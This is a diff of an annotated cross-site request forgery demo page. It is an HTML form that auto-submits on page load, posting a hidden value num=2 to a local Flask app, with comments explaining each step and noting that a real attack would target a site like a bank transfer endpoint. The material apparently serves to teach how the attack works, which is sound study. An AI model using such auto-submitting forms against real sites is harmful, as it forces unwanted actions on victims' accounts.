@@ -1,8 +1,16 @@
-<!-- hosted on hacker-site.com -->
 <html>
   <body onload="document.forms[0].submit()">
+    <!-- onload runs JavaScript when the page is loaded in the browser.
+         It immediately submits the first form on the page (forms[0]). -->
+
     <form action="http://127.0.0.1:5000" method="POST">
+      <!-- This form will send a POST request to your Flask app running on localhost port 5000.
+           In a real attack, this would be a live target (e.g., https://bank.com/transfer). -->
+
       <input type="hidden" name="num" value="2">
+      <!-- This hidden input is where the attacker injects data.
+           'name="num"' matches the input field expected by your Flask app.
+           'value="2"' means the attacker is forcing num=2 to be submitted. -->
     </form>
   </body>
 </html>
